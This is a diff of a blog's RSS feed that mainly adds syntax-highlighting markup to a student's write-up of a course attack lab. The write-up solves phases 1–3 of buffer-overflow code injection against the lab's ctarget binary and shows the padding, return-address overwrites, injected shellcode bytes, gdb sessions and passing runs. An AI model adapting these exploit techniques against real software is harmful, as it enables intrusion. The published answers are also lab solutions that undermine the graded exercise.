@@ -4,8 +4,8 @@
 		<title>Navan's Archive</title>
 		<description>Rare Tips, Tricks and Posts</description>
 		<link>https://web.navan.dev/</link><language>en</language>
-		<lastBuildDate>Tue, 17 Oct 2023 14:53:31 -0000</lastBuildDate>
-		<pubDate>Tue, 17 Oct 2023 14:53:31 -0000</pubDate>
+		<lastBuildDate>Tue, 17 Oct 2023 15:18:29 -0000</lastBuildDate>
+		<pubDate>Tue, 17 Oct 2023 15:18:29 -0000</pubDate>
 		<ttl>250</ttl>
 		<atom:link href="https://web.navan.dev/feed.rss" rel="self" type="application/rss+xml"/>
 		
@@ -1412,15 +1412,19 @@ Serving HTTP on 0.0.0.0 port 8000 ...
 
 <p>Now, since we know the buffer size we can try passing the address of the touch1 function.</p>
 
-<pre><code>jxxxan@jupyter-xxxxxx8:~/lab3-attacklab-xxxxxxxxuhan/target66$ cat dis.txt | grep touch1
-000000000040261e &lt;touch1&gt;:
+<div class="codehilite">
+<pre><span></span><code>jxxxan@jupyter-xxxxxx8:~/lab3-attacklab-xxxxxxxxuhan/target66$<span class="w"> </span>cat<span class="w"> </span>dis.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>touch1
+000000000040261e<span class="w"> </span>&lt;touch1&gt;:
 </code></pre>
+</div>
 
 <p>We were told in our recitation that our system was little-endian (so the bytes will be in the reverse order). Otherwise, we can use python to check:</p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ python -c 'import sys; print(sys.byteorder)'
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import sys; print(sys.byteorder)&#39;</span>
 little
 </code></pre>
+</div>
 
 <p>We have our padding size and the function we need to call, we can write it in <code>ctarget.l1.txt</code></p>
 
@@ -1430,13 +1434,15 @@ little
 1e 26 40 00 00 00 00 00
 </code></pre>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l1.txt | ./ctarget 
-Cookie: 0x3e8dee8f
-Type string:Touch1!: You called touch1()
-Valid solution for level 1 with target ctarget
-PASS: Sent exploit string to server to be validated.
-NICE JOB!
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>./hex2raw<span class="w"> </span>&lt;<span class="w"> </span>ctarget.l1.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./ctarget<span class="w"> </span>
+Cookie:<span class="w"> </span>0x3e8dee8f
+Type<span class="w"> </span>string:Touch1!:<span class="w"> </span>You<span class="w"> </span>called<span class="w"> </span>touch1<span class="o">()</span>
+Valid<span class="w"> </span>solution<span class="w"> </span><span class="k">for</span><span class="w"> </span>level<span class="w"> </span><span class="m">1</span><span class="w"> </span>with<span class="w"> </span>target<span class="w"> </span>ctarget
+PASS:<span class="w"> </span>Sent<span class="w"> </span>exploit<span class="w"> </span>string<span class="w"> </span>to<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>validated.
+NICE<span class="w"> </span>JOB!
 </code></pre>
+</div>
 
 <h2>Phase 2</h2>
 
@@ -1475,25 +1481,29 @@ NICE JOB!
 
 <p>This hint tells us that we need to store the cookie in the rdi register</p>
 
-<pre><code>movq $0x3e8dee8f,%rdi 
-retq
+<div class="codehilite">
+<pre><span></span><code><span class="nf">movq</span><span class="w"> </span><span class="no">$0x3e8dee8f</span><span class="p">,</span><span class="nv">%rdi</span><span class="w"> </span>
+<span class="no">retq</span>
 </code></pre>
+</div>
 
 <p>To get the byte representation, we need to compile the code and then disassemble it.</p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase2.s &amp;&amp; objdump -d phase2.o
-phase2.s: Assembler messages:
-phase2.s: Warning: end of file not at end of a line; newline inserted
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>gcc<span class="w"> </span>-c<span class="w"> </span>phase2.s<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>phase2.o
+phase2.s:<span class="w"> </span>Assembler<span class="w"> </span>messages:
+phase2.s:<span class="w"> </span>Warning:<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>file<span class="w"> </span>not<span class="w"> </span>at<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>a<span class="w"> </span>line<span class="p">;</span><span class="w"> </span>newline<span class="w"> </span>inserted
 
-phase2.o:     file format elf64-x86-64
+phase2.o:<span class="w">     </span>file<span class="w"> </span>format<span class="w"> </span>elf64-x86-64
 
 
-Disassembly of section .text:
+Disassembly<span class="w"> </span>of<span class="w"> </span>section<span class="w"> </span>.text:
 
-0000000000000000 &lt;.text&gt;:
-   0:   48 c7 c7 8f ee 8d 3e    mov    $0x3e8dee8f,%rdi
-   7:   c3                      ret    
+<span class="m">0000000000000000</span><span class="w"> </span>&lt;.text&gt;:
+<span class="w">   </span><span class="m">0</span>:<span class="w">   </span><span class="m">48</span><span class="w"> </span>c7<span class="w"> </span>c7<span class="w"> </span>8f<span class="w"> </span>ee<span class="w"> </span>8d<span class="w"> </span>3e<span class="w">    </span>mov<span class="w">    </span><span class="nv">$0</span>x3e8dee8f,%rdi
+<span class="w">   </span><span class="m">7</span>:<span class="w">   </span>c3<span class="w">                      </span>ret<span class="w">    </span>
 </code></pre>
+</div>
 
 <p>Thus, the byte representation for our asm code is <code>48 c7 c7 8f ee 8d 3e c3</code></p>
 
@@ -1512,48 +1522,50 @@ Disassembly of section .text:
 
 <p>What we are going to do now is to add a break on <code>getbuf</code>, and run the program just after it asks us to enter a string and then find the address of <code>%rsp</code></p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gdb ./ctarget
-GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
-Copyright (C) 2022 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.
-Type "show copying" and "show warranty" for details.
-This GDB was configured as "x86_64-linux-gnu".
-Type "show configuration" for configuration details.
-For bug reporting instructions, please see:
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>gdb<span class="w"> </span>./ctarget
+GNU<span class="w"> </span>gdb<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span><span class="m">12</span>.1-0ubuntu1~22.04<span class="o">)</span><span class="w"> </span><span class="m">12</span>.1
+Copyright<span class="w"> </span><span class="o">(</span>C<span class="o">)</span><span class="w"> </span><span class="m">2022</span><span class="w"> </span>Free<span class="w"> </span>Software<span class="w"> </span>Foundation,<span class="w"> </span>Inc.
+License<span class="w"> </span>GPLv3+:<span class="w"> </span>GNU<span class="w"> </span>GPL<span class="w"> </span>version<span class="w"> </span><span class="m">3</span><span class="w"> </span>or<span class="w"> </span>later<span class="w"> </span>&lt;http://gnu.org/licenses/gpl.html&gt;
+This<span class="w"> </span>is<span class="w"> </span>free<span class="w"> </span>software:<span class="w"> </span>you<span class="w"> </span>are<span class="w"> </span>free<span class="w"> </span>to<span class="w"> </span>change<span class="w"> </span>and<span class="w"> </span>redistribute<span class="w"> </span>it.
+There<span class="w"> </span>is<span class="w"> </span>NO<span class="w"> </span>WARRANTY,<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>extent<span class="w"> </span>permitted<span class="w"> </span>by<span class="w"> </span>law.
+Type<span class="w"> </span><span class="s2">&quot;show copying&quot;</span><span class="w"> </span>and<span class="w"> </span><span class="s2">&quot;show warranty&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>details.
+This<span class="w"> </span>GDB<span class="w"> </span>was<span class="w"> </span>configured<span class="w"> </span>as<span class="w"> </span><span class="s2">&quot;x86_64-linux-gnu&quot;</span>.
+Type<span class="w"> </span><span class="s2">&quot;show configuration&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>configuration<span class="w"> </span>details.
+For<span class="w"> </span>bug<span class="w"> </span>reporting<span class="w"> </span>instructions,<span class="w"> </span>please<span class="w"> </span>see:
 &lt;https://www.gnu.org/software/gdb/bugs/&gt;.
-Find the GDB manual and other documentation resources online at:
-    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+Find<span class="w"> </span>the<span class="w"> </span>GDB<span class="w"> </span>manual<span class="w"> </span>and<span class="w"> </span>other<span class="w"> </span>documentation<span class="w"> </span>resources<span class="w"> </span>online<span class="w"> </span>at:
+<span class="w">    </span>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
 
-For help, type "help".
-Type "apropos word" to search for commands related to "word"...
-Reading symbols from ./ctarget...
-(gdb) b getbuf
-Breakpoint 1 at 0x402608: file buf.c, line 12.
-(gdb) run
-Starting program: /home/jxxxxn/lab3-attacklab-naxxxan/target66/ctarget 
-Cookie: 0x3e8dee8f
+For<span class="w"> </span>help,<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;help&quot;</span>.
+Type<span class="w"> </span><span class="s2">&quot;apropos word&quot;</span><span class="w"> </span>to<span class="w"> </span>search<span class="w"> </span><span class="k">for</span><span class="w"> </span>commands<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span><span class="s2">&quot;word&quot;</span>...
+Reading<span class="w"> </span>symbols<span class="w"> </span>from<span class="w"> </span>./ctarget...
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>b<span class="w"> </span>getbuf
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x402608:<span class="w"> </span>file<span class="w"> </span>buf.c,<span class="w"> </span>line<span class="w"> </span><span class="m">12</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/jxxxxn/lab3-attacklab-naxxxan/target66/ctarget<span class="w"> </span>
+Cookie:<span class="w"> </span>0x3e8dee8f
 
-Breakpoint 1, getbuf () at buf.c:12
-12      buf.c: No such file or directory.
-(gdb) disas
-Dump of assembler code for function getbuf:
-=&gt; 0x0000000000402608 &lt;+0&gt;:     sub    $0x18,%rsp
-   0x000000000040260c &lt;+4&gt;:     mov    %rsp,%rdi
-   0x000000000040260f &lt;+7&gt;:     call   0x4028a9 &lt;Gets&gt;
-   0x0000000000402614 &lt;+12&gt;:    mov    $0x1,%eax
-   0x0000000000402619 &lt;+17&gt;:    add    $0x18,%rsp
-   0x000000000040261d &lt;+21&gt;:    ret    
-End of assembler dump.
-(gdb) until *0x402614
-Type string:fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe
-getbuf () at buf.c:15
-15      in buf.c
-(gdb) x/s $rsp
-0x55621b40:     "fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe"
-(gdb)
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>getbuf<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>buf.c:12
+<span class="m">12</span><span class="w">      </span>buf.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disas
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>getbuf:
+<span class="o">=</span>&gt;<span class="w"> </span>0x0000000000402608<span class="w"> </span>&lt;+0&gt;:<span class="w">     </span>sub<span class="w">    </span><span class="nv">$0</span>x18,%rsp
+<span class="w">   </span>0x000000000040260c<span class="w"> </span>&lt;+4&gt;:<span class="w">     </span>mov<span class="w">    </span>%rsp,%rdi
+<span class="w">   </span>0x000000000040260f<span class="w"> </span>&lt;+7&gt;:<span class="w">     </span>call<span class="w">   </span>0x4028a9<span class="w"> </span>&lt;Gets&gt;
+<span class="w">   </span>0x0000000000402614<span class="w"> </span>&lt;+12&gt;:<span class="w">    </span>mov<span class="w">    </span><span class="nv">$0</span>x1,%eax
+<span class="w">   </span>0x0000000000402619<span class="w"> </span>&lt;+17&gt;:<span class="w">    </span>add<span class="w">    </span><span class="nv">$0</span>x18,%rsp
+<span class="w">   </span>0x000000000040261d<span class="w"> </span>&lt;+21&gt;:<span class="w">    </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">until</span><span class="w"> </span>*0x402614
+Type<span class="w"> </span>string:fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470<span class="w"> </span>trq378t4378gwe
+getbuf<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>buf.c:15
+<span class="m">15</span><span class="w">      </span><span class="k">in</span><span class="w"> </span>buf.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/s<span class="w"> </span><span class="nv">$rsp</span>
+0x55621b40:<span class="w">     </span><span class="s2">&quot;fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe&quot;</span>
+<span class="o">(</span>gdb<span class="o">)</span>
 </code></pre>
+</div>
 
 <p>So, the address for <code>%rsp</code> is <code>0x55621b40</code></p>
 
@@ -1567,11 +1579,13 @@ address of touch2 function
 
 <p>To get the address of <code>touch2</code> we can run:</p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch2
-000000000040264e &lt;touch2&gt;:
-  402666:       74 2a                   je     402692 &lt;touch2+0x44&gt;
-  4026b2:       eb d4                   jmp    402688 &lt;touch2+0x3a&gt;
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>cat<span class="w"> </span>dis.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>touch2
+000000000040264e<span class="w"> </span>&lt;touch2&gt;:
+<span class="w">  </span><span class="m">402666</span>:<span class="w">       </span><span class="m">74</span><span class="w"> </span>2a<span class="w">                   </span>je<span class="w">     </span><span class="m">402692</span><span class="w"> </span>&lt;touch2+0x44&gt;
+<span class="w">  </span>4026b2:<span class="w">       </span>eb<span class="w"> </span>d4<span class="w">                   </span>jmp<span class="w">    </span><span class="m">402688</span><span class="w"> </span>&lt;touch2+0x3a&gt;
 </code></pre>
+</div>
 
 <pre><code>48 c7 c7 8f ee 8d 3e c3
 00 00 00 00 00 00 00 00
@@ -1582,13 +1596,15 @@ address of touch2 function
 
 <p>Do note that our required padding is 24 bytes, we are only adding 16 bytes because our asm code is 8 bytes on its own. Our goal is to have a total of 24 bytes in padding, not 8 + 24 bytes, </p>
 
-<pre><code>joxxxx@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l2.txt | ./ctarget 
-Cookie: 0x3e8dee8f
-Type string:Touch2!: You called touch2(0x3e8dee8f)
-Valid solution for level 2 with target ctarget
-PASS: Sent exploit string to server to be validated.
-NICE JOB!
+<div class="codehilite">
+<pre><span></span><code>joxxxx@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>./hex2raw<span class="w"> </span>&lt;<span class="w"> </span>ctarget.l2.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./ctarget<span class="w"> </span>
+Cookie:<span class="w"> </span>0x3e8dee8f
+Type<span class="w"> </span>string:Touch2!:<span class="w"> </span>You<span class="w"> </span>called<span class="w"> </span>touch2<span class="o">(</span>0x3e8dee8f<span class="o">)</span>
+Valid<span class="w"> </span>solution<span class="w"> </span><span class="k">for</span><span class="w"> </span>level<span class="w"> </span><span class="m">2</span><span class="w"> </span>with<span class="w"> </span>target<span class="w"> </span>ctarget
+PASS:<span class="w"> </span>Sent<span class="w"> </span>exploit<span class="w"> </span>string<span class="w"> </span>to<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>validated.
+NICE<span class="w"> </span>JOB!
 </code></pre>
+</div>
 
 <h2>Phase 3</h2>
 
@@ -1613,7 +1629,14 @@ NICE JOB!
 
 <p>Because <code>hexmatch</code> and <code>strncmp</code> might overwrite the buffer allocated for <code>getbuf</code> we will try to store the data after the function <code>touch3</code> itself.</p>
 
+<p>The rationale is simple: by the time our payload is executed, we will be setting <code>%rdi</code> to point to the cookie. Placing the cookie after <code>touch3</code> function ensures that it will not be overwritten by the function calls. It also means that we can calculate the address of the cookie with relative ease, based on the known offsets.</p>
+
 <p>=&gt; The total bytes before the cookie = Buffer (0x18 in our case) + Return Address of %rsp (8 bytes) + Touch 3 (8 Bytes) = 0x18 + 8 + 8 = 28 (hex)</p>
+
+<ul>
+<li>Return Address (8 Bytes): Since in a 64 bit system the return address is always 8 bytes, by overwriting this address, we redirect the function to jump to our desired location upon returning (e.g. the beginning of the <code>touch3</code> function)</li>
+<li>Touch 3 (8 bytes): The address of the <code>touch3</code> function is 8 bytes long.</li>
+</ul>
 
 <p>We can use our address for <code>%rsp</code> from phase 2, and simply add <code>0x28</code> to it.</p>
 
@@ -1627,19 +1650,21 @@ NICE JOB!
 </code></pre>
 </div>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase3.s &amp;&amp; objdump -d phase3.o
-phase3.s: Assembler messages:
-phase3.s: Warning: end of file not at end of a line; newline inserted
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>gcc<span class="w"> </span>-c<span class="w"> </span>phase3.s<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>phase3.o
+phase3.s:<span class="w"> </span>Assembler<span class="w"> </span>messages:
+phase3.s:<span class="w"> </span>Warning:<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>file<span class="w"> </span>not<span class="w"> </span>at<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>a<span class="w"> </span>line<span class="p">;</span><span class="w"> </span>newline<span class="w"> </span>inserted
 
-phase3.o:     file format elf64-x86-64
+phase3.o:<span class="w">     </span>file<span class="w"> </span>format<span class="w"> </span>elf64-x86-64
 
 
-Disassembly of section .text:
+Disassembly<span class="w"> </span>of<span class="w"> </span>section<span class="w"> </span>.text:
 
-0000000000000000 &lt;.text&gt;:
-   0:   48 c7 c7 68 1b 62 55    mov    $0x55621b68,%rdi
-   7:   c3                      ret
+<span class="m">0000000000000000</span><span class="w"> </span>&lt;.text&gt;:
+<span class="w">   </span><span class="m">0</span>:<span class="w">   </span><span class="m">48</span><span class="w"> </span>c7<span class="w"> </span>c7<span class="w"> </span><span class="m">68</span><span class="w"> </span>1b<span class="w"> </span><span class="m">62</span><span class="w"> </span><span class="m">55</span><span class="w">    </span>mov<span class="w">    </span><span class="nv">$0</span>x55621b68,%rdi
+<span class="w">   </span><span class="m">7</span>:<span class="w">   </span>c3<span class="w">                      </span>ret
 </code></pre>
+</div>
 
 <p>Thus, our answer is going to be in the form:</p>
 
@@ -1652,17 +1677,21 @@ cookie string
 
 <p>To quickly get the address for <code>touch3</code></p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch3
-0000000000402763 &lt;touch3&gt;:
-  402781:       74 2d                   je     4027b0 &lt;touch3+0x4d&gt;
-  4027d3:       eb d1                   jmp    4027a6 &lt;touch3+0x43&gt;
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>cat<span class="w"> </span>dis.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>touch3
+<span class="m">0000000000402763</span><span class="w"> </span>&lt;touch3&gt;:
+<span class="w">  </span><span class="m">402781</span>:<span class="w">       </span><span class="m">74</span><span class="w"> </span>2d<span class="w">                   </span>je<span class="w">     </span>4027b0<span class="w"> </span>&lt;touch3+0x4d&gt;
+<span class="w">  </span>4027d3:<span class="w">       </span>eb<span class="w"> </span>d1<span class="w">                   </span>jmp<span class="w">    </span>4027a6<span class="w"> </span>&lt;touch3+0x43&gt;
 </code></pre>
+</div>
 
 <p>We need to use an ASCII to Hex converter to convert the cookie string into hex.</p>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ echo -n 3e8dee8f | xxd -p
-3365386465653866
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span>3e8dee8f<span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-p
+<span class="m">3365386465653866</span>
 </code></pre>
+</div>
 
 <p>Thus, our cookie string representation is <code>33 65 38 64 65 65 38 66</code></p>
 
@@ -1674,13 +1703,15 @@ cookie string
 33 65 38 64 65 65 38 66
 </code></pre>
 
-<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l3.txt | ./ctarget 
-Cookie: 0x3e8dee8f
-Type string:Touch3!: You called touch3("3e8dee8f")
-Valid solution for level 3 with target ctarget
-PASS: Sent exploit string to server to be validated.
-NICE JOB!
+<div class="codehilite">
+<pre><span></span><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$<span class="w"> </span>./hex2raw<span class="w"> </span>&lt;<span class="w"> </span>ctarget.l3.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./ctarget<span class="w"> </span>
+Cookie:<span class="w"> </span>0x3e8dee8f
+Type<span class="w"> </span>string:Touch3!:<span class="w"> </span>You<span class="w"> </span>called<span class="w"> </span>touch3<span class="o">(</span><span class="s2">&quot;3e8dee8f&quot;</span><span class="o">)</span>
+Valid<span class="w"> </span>solution<span class="w"> </span><span class="k">for</span><span class="w"> </span>level<span class="w"> </span><span class="m">3</span><span class="w"> </span>with<span class="w"> </span>target<span class="w"> </span>ctarget
+PASS:<span class="w"> </span>Sent<span class="w"> </span>exploit<span class="w"> </span>string<span class="w"> </span>to<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>validated.
+NICE<span class="w"> </span>JOB!
 </code></pre>
+</div>
 
 <p>Phases 1-3 Complete.</p>
 ]]></content:encoded>
